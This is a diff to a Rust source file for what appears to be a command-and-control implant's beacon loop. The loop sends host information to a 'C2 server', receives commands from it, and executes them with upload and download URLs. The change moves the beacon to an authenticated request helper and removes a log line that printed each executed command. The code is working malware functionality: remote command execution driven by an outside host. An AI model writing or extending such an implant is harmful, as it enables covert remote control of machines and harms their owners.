@@ -1,11 +1,11 @@
 use rand::Rng;
-use reqwest::Client;
 use serde::Serialize;
 use std::{thread, time::Duration};
 use sysinfo::System;
 use uuid::Uuid;
 
 use crate::commands::execute::execute_command;
+use crate::utils::request::send_authenticated_request;
 
 #[derive(Serialize)]
 struct Beacon {
@@ -24,7 +24,6 @@ pub async fn run(
     upload_url: &str,
     download_url: &str,
 ) {
-    let client = Client::new();
     let mut sys = System::new_all();
 
     // Default command output
@@ -43,10 +42,12 @@ pub async fn run(
             uuid,
         };
 
-        // Send the beacon to the C2 server
-        let res = client.post(beacon_url).json(&beacon).send().await;
-        println!("Beacon sent at {}", chrono::Utc::now());
+        let beacon_json = &serde_json::json!(beacon);
 
+        // Send the beacon to the C2 server
+        println!("Sending beacon at {}", chrono::Utc::now());
+        let res = send_authenticated_request("post", beacon_url, beacon_json).await;
+        println!("Attempted to send beacon, response: {}", res.as_ref().unwrap().status());
         // Handle the response from the server
         match res {
             Ok(response) => {
@@ -55,7 +56,6 @@ pub async fn run(
                     let command: serde_json::Value = response.json().await.unwrap();
                     if let Some(cmd) = command.get("command").and_then(|c| c.as_str()) {
                         if !cmd.is_empty() {
-                            println!("Executing command: {}", cmd);
                             // Execute the received command
                             match execute_command(uuid, cmd, upload_url, download_url).await {
                                 Ok(output) => {
@@ -71,7 +71,7 @@ pub async fn run(
                 }
             }
             Err(e) => {
-                println!("Error response from server: {}", e);
+                println!("Error sending request: {}", e);
             }
         }
 
